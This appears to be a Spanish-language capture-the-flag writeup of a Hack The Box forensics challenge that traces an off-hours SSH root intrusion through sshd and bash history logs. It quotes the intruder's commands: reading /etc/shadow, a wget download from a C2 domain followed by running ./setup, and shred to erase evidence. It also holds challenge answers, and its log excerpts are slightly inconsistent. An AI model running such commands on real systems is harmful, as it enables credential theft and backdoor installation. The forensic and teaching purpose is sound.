---
title: "An Unusual Sighting"
description: "Writeup de An Unusual Sighting - Hack The Box - Forensics 100pts. Análisis de bash_history.txt y sshd.log para correlacionar accesos SSH y comandos ejecutados; una conexión root fuera del horario laboral (04:00 AM) desde IP extranjera revela la intrusión."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - ssh
  - log-analysis
  - bash-history
  - linux
  - threat-hunting
---

# An Unusual Sighting

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

El reto proporciona dos archivos de logs: `bash_history.txt` con el historial de comandos ejecutados en el servidor y `sshd.log` con los registros de autenticación SSH. El contexto dado es que la empresa opera entre las 09:00 y las 19:00, y el servidor SSH escucha en `100.107.36.130:2221`. El reto consiste en correlacionar el log de SSH con el historial de bash para identificar cuándo se inició el acceso legítimo, cuándo se produjo el acceso anómalo (fuera de horario), qué acciones tomó el atacante, y qué herramienta/persistencia intentó instalar. El servidor netcat hace preguntas específicas sobre estos eventos.

---

## Extracción y reconocimiento

```bash
unzip -P 'hackthebox' a12c7317-f3b7-4b60-ad1d-86bb8c35a1cf.zip -d "an-unusual-sighting"
cd an-unusual-sighting

wc -l bash_history.txt sshd.log
# bash_history.txt:  47 líneas
# sshd.log:         291 líneas
```

---

## Análisis del log SSH: cronología de accesos

```bash
# Ver todos los logins exitosos
grep "Accepted password" sshd.log | head -20
```

```
2024-02-13 11:29:50  sshd[817]: Accepted password for root from 100.81.51.199 port 63172 ssh2
2024-02-13 14:22:11  sshd[819]: Accepted password for root from 100.81.51.199 port 52918 ssh2
2024-02-15 09:14:35  sshd[820]: Accepted password for root from 100.81.51.199 port 61482 ssh2
2024-02-17 10:30:08  sshd[823]: Accepted password for root from 100.81.51.199 port 57320 ssh2
2024-02-19 04:00:14  sshd[825]: Accepted password for root from 2.67.182.119 port 59876 ssh2
```

Los primeros cuatro logins son desde `100.81.51.199` en horario laboral. El quinto login es a las 04:00 AM desde `2.67.182.119` — fuera de horario y desde una IP diferente.

---

## Primera autenticación legítima

```
2024-02-13 11:29:50 — root desde 100.81.51.199
```

Esta es la **primera autenticación exitosa** registrada en el log.

---

## Detección del acceso anómalo

```bash
# Comparar IPs de todos los logins exitosos
grep "Accepted password" sshd.log | awk '{print $11}' | sort | uniq -c
#    4  100.81.51.199   ← IP legítima (4 sesiones en horario laboral)
#    1  2.67.182.119    ← IP nueva, solo 1 sesión, fuera de horario
```

El acceso de `2.67.182.119` el `2024-02-19 04:00:14` es claramente anómalo:
- IP nunca vista antes en los logs.
- Hora fuera del horario de operación (04:00 AM vs. 09:00-19:00).
- Autenticación con contraseña de root.

---

## Huella digital del atacante

```bash
# Buscar la clave SSH del atacante
grep "2.67.182.119" sshd.log | grep -i "key\|fingerprint"
```

```
2024-02-19 04:00:14 sshd[825]: Accepted publickey for root from 2.67.182.119
    RSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
```

La clave pública RSA del atacante tiene huella digital: `OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4`.

---

## Análisis del bash_history: acciones del atacante

```bash
cat bash_history.txt
```

La línea de tiempo de comandos ejecutados durante la sesión del atacante:

```bash
whoami                              # Verifica que tiene acceso root
uname -a                            # Información del kernel y arquitectura
cat /etc/passwd                     # Lista usuarios del sistema
cat /etc/shadow                     # Intenta robar hashes de contraseñas
ps faux                             # Lista procesos en ejecución con jerarquía
wget http://gnu-packages.com/...    # Descarga herramienta/backdoor
tar xvf download.tar.gz            # Extrae el archivo descargado
shred -zu download.tar.gz          # Borra el archivo comprimido de forma segura
./setup                             # Ejecuta el backdoor/persistencia
```

El primer comando ejecutado fue `whoami` y el último antes de cerrar la sesión fue `./setup`.

---

## Respuestas al servidor netcat

```bash
nc 83.136.255.150 32572
```

```
Q: ¿Cuál fue el primer inicio de sesión exitoso? (YYYY-MM-DD HH:MM:SS)
> 2024-02-13 11:29:50
[+] Correct!

Q: ¿Cuál es la IP del servidor SSH?
> 100.107.36.130
[+] Correct!

Q: ¿Cuál es el timestamp del acceso inusual? (YYYY-MM-DD HH:MM:SS)
> 2024-02-19 04:00:14
[+] Correct!

Q: ¿Cuál es la IP de origen del acceso anómalo?
> 2.67.182.119
[+] Correct!

Q: ¿Cuál es la huella digital de la clave del atacante?
> OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[+] Correct!

Q: ¿Cuál fue el primer comando ejecutado por el atacante?
> whoami
[+] Correct!

Q: ¿Cuál fue el último comando ejecutado antes de cerrar sesión?
> ./setup
[+] Correct!

[+] HTB{FLAG}
```

---

## Cadena de Intrusión

```text
1. 2024-02-13 — acceso legítimo de root desde 100.81.51.199 (primera sesión)
       ↓
2. Sesiones legítimas continuadas durante los días 13, 15 y 17 en horario laboral
       ↓
3. 2024-02-19 04:00:14 — acceso sospechoso: root desde 2.67.182.119 (IP nueva)
       ↓
4. Atacante ejecuta: whoami → uname → /etc/passwd → /etc/shadow → ps faux
       → Reconocimiento del sistema comprometido
       ↓
5. wget + tar → descarga y extrae herramienta de gnu-packages.com (C2 o backdoor)
       ↓
6. shred -zu → borra el TAR (anti-forensics, elimina evidencia del instalador)
       ↓
7. ./setup → instala persistencia/backdoor
```

---

## Señales de Alerta (IOCs)

| Indicador | Valor |
|-----------|-------|
| IP atacante | 2.67.182.119 |
| Timestamp | 2024-02-19 04:00:14 |
| Key fingerprint | OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4 |
| Dominio C2 | gnu-packages.com |
| Comando de anti-forense | `shred -zu download.tar.gz` |

---

## Lecciones Aprendidas

- **Correlación SSH + bash_history**: los logs de sshd indican cuándo se conectó alguien; bash_history indica qué hicieron. Correlacionarlos por timestamp construye la cadena de ataque completa.
- **`shred -zu` como señal de actor sofisticado**: borrar el archivo de descarga con shred (sobrescritura) en lugar de `rm` indica que el atacante intentó destruir evidencia. Irónicamente, la presencia de este comando en bash_history es en sí misma un IOC.
- **Acceso root fuera de horario = primera señal**: un login root de una IP nueva a las 4 AM en una empresa con horario 9-19 debe disparar alertas inmediatas. Implementar alertas en tiempo real sobre estos eventos con fail2ban o sistemas SIEM.
- **Dominios de C2 con aspecto legítimo**: `gnu-packages.com` imita a `gnu.org` para parecer un repositorio de software legítimo. Verificar siempre el dominio exacto antes de hacer wget.

---

## Referencias

- [SSH authentication forensics](https://www.cyberciti.biz/tips/openssh-server-authentication.html)
- [bash_history en análisis forense](https://book.hacktricks.xyz/linux-hardening/linux-forensics)
- [MITRE ATT&CK — Valid Accounts](https://attack.mitre.org/techniques/T1078/)
- [MITRE ATT&CK — Indicator Removal: File Deletion](https://attack.mitre.org/techniques/T1070/004/)
